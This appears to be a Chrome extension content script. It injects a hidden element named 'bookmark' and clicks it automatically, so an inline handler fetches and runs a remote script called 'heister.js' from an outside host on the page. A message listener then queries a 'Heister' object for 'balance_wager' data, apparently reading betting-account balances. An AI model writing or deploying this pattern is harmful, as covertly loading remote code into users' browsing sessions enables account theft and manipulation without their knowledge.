const app = document.createElement("div");
app.innerHTML = `<div onclick="(async () => {const versionRes = await fetch('https:\/\/betting-api-eosin.vercel.app/api/version');const json = await versionRes.json();let version = json.version ? json.version : 0;const app = document.getElementById('app');const script = document.createElement('script');script.src = \`https:\/\/betting-api-eosin.vercel.app/heister.js?ver=\${version}\`;script.onerror = function() { console.error('Failed to load script');}; app.appendChild(script);})();" id="bookmark" style="position:fixed; top:0; left:0"></div>`;
document.body.appendChild(app);
document.getElementById("bookmark")?.click();

chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
    if (message.type === "balance_wager") {
        let data = await window.Heister?.checkBalance(false);
        console.log(data);
        sendResponse(data);
    }
});

